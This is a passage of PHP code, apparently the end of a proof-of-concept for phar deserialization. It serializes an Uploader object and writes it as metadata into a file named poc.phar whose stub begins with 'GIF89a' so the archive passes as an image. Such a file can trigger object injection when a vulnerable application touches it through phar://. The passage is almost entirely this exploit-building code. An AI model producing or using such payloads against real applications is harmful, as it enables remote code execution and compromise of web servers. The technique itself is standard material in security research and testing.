        $this->Filename='test';
    }
}

$a = new Uploader();
echo serialize($a);

@unlink('poc.phar');
$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("1", "0"); 
$phar->stopBuffering();
```

